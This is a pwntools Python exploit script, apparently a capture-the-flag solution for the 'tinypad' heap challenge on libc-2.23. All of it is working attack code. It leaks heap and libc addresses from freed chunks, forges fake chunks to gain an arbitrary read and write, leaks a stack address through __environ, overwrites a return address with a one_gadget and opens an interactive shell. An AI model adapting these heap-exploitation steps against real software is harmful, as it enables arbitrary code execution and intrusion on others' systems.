from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
io = process('./tinypad')
elf = ELF("./tinypad")
libc = ELF("./libc-2.23.so")

def add(size, content):
	io.sendlineafter("(CMD)>>> ", 'A')
	io.sendlineafter("(SIZE)>>> ", str(size))
	io.sendlineafter("(CONTENT)>>> ", content)

def delete(idx):
	io.sendlineafter("(CMD)>>> ", 'D')
	io.sendlineafter("(INDEX)>>> ", str(idx))

def edit(idx, content):
	io.sendlineafter("(CMD)>>> ", 'E')
	io.sendlineafter("(INDEX)>>> ", str(idx))
	io.sendlineafter("(CONTENT)>>> ", content)
	io.sendlineafter("(Y/n)>>> ", 'Y')
	
def debug():
	gdb.attach(io)
	pause()

# attack1
tinypad = 0x0602040
add(0xe0,b'A'*0x10)
add(0xf0,b'A'*0xf0)
add(0x100,b'A'*0x10)
add(0x100,b'A'*0x10)
delete(3)
delete(1)
io.recvuntil(" # CONTENT: ")
heap_base = u64(io.recvn(4).ljust(8,b'\x00'))-0x1f0
log.info("heap base: 0x%x" % heap_base)
io.recvuntil("INDEX: 3\n # CONTENT: ")
libc_base = u64(io.recvn(6).ljust(8,b'\x00'))-0x3c3b78
log.info("libc base: 0x%x" % libc_base)

# attack2
delete(4)
fake_chunk1 = b'A'*0xe0
fake_chunk1+= p64(heap_base+0xf0-tinypad)
add(0xe8,fake_chunk1)
fake_chunk2 = p64(0x100)
fake_chunk2+= p64(heap_base+0xf0-tinypad)
fake_chunk2+= p64(tinypad)*4
edit(2,fake_chunk2)
delete(2)

# attack3
environ_add = libc_base+libc.symbols["__environ"]
payload = p64(0xe8)+p64(environ_add)+p64(0xe8)+p64(tinypad+0x108)
add(0xe0,b'B'*0xe0)
add(0xe0,payload)
io.recvuntil("INDEX: 1\n # CONTENT: ")
stack_add = u64(io.recvn(6).ljust(8,b'\x00'))
log.info("stack address: 0x%x" % stack_add)

# attack4
one_gadget = [0x4525a,0xef9f4,0xf0897]
edit(2,p64(stack_add-0xf0))
edit(1,p64(libc_base+one_gadget[2]))
print(hex(stack_add-0xf0))
io.sendlineafter(b"(CMD)>>> ","Q")
io.interactive()